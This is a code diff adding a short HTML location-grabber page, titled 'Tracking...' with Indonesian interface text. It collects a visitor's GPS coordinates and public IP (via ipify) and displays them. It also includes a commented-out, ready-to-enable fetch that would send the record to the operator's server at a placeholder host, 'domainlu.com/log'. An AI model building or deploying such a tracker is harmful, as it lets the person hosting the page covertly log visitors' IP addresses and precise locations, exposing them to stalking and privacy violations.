@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Tracking...</h2>
+
+<p id="status">Mengambil lokasi...</p>
+<pre id="output"></pre>
+
+<script>
+async function getIP() {
+    let res = await fetch('https://api.ipify.org?format=json');
+    let data = await res.json();
+    return data.ip;
+}
+
+function getLocation() {
+    if (!navigator.geolocation) {
+        document.getElementById("status").textContent = "GPS tidak tersedia.";
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const ip = await getIP();
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+
+        const result = {
+            ip: ip,
+            latitude: lat,
+            longitude: lon,
+            accuracy: acc + " meter",
+            timestamp: new Date().toString()
+        };
+
+        document.getElementById("output").textContent = JSON.stringify(result, null, 2);
+
+        // Optional: kirim lokasi ke server lu
+        // await fetch("https://domainlu.com/log", {
+        //    method: "POST",
+        //    headers: {"Content-Type": "application/json"},
+        //    body: JSON.stringify(result)
+        // });
+
+    }, () => {
+        document.getElementById("status").textContent = "Izin lokasi ditolak.";
+    });
+}
+
+getLocation();
+</script>
+</body>
+</html>
